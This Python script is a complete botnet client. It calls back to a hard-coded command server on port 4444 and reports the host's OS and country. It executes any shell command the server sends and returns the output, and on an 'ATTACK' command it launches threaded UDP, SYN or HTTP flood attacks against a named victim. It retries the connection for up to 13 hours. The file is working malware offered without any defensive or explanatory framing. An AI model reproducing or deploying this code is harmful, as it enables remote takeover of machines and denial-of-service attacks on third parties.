import socket
import platform
import subprocess
import time
import os
import threading
from scapy.all import IP, UDP, TCP, send

SERVER_IP = '10.0.1.12'  # Replace with the server's IP
PORT = 4444
RECONNECT_INTERVAL = 5
TIMEOUT = 60 * 60 * 13  # 13 hours

def get_os_info():
    return platform.platform()

def get_country_info():
    try:
        import requests
        response = requests.get("https://ipinfo.io")
        data = response.json()
        country = data.get("country", "Unknown")
        return country
    except Exception as e:
        return f"Error fetching country: {str(e)}"

def execute_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return output.decode(errors='ignore')
    except Exception as e:
        return str(e)

def perform_ddos(victim, port, attack_type, threads):
    def attack():
        if attack_type == "UDP":
            packet = IP(dst=victim)/UDP(dport=port)
        elif attack_type == "SYN":
            packet = IP(dst=victim)/TCP(dport=port, flags="S")
        elif attack_type == "HTTP":
            packet = IP(dst=victim)/TCP(dport=port)/("GET / HTTP/1.1\r\n\r\n")
        else:
            return
        send(packet, loop=1, verbose=0)
    
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=attack)
        t.start()
        threads_list.append(t)
    
    for t in threads_list:
        t.join()

def connect():
    start_time = time.time()
    while True:
        try:
            s = socket.socket()
            s.connect((SERVER_IP, PORT))
            os_info = get_os_info()
            country_info = get_country_info()
            client_info = f"{os_info}\nCountry: {country_info}"
            s.send(client_info.encode())
            while True:
                cmd = s.recv(1024).decode()
                if cmd.startswith("ATTACK"):
                    _, victim, port, attack_type, threads = cmd.split()
                    perform_ddos(victim, int(port), attack_type, int(threads))
                else:
                    result = execute_command(cmd)
                    s.send(result.encode())
        except:
            if time.time() - start_time > TIMEOUT:
                break
            time.sleep(RECONNECT_INTERVAL)

if __name__ == '__main__':
    connect()
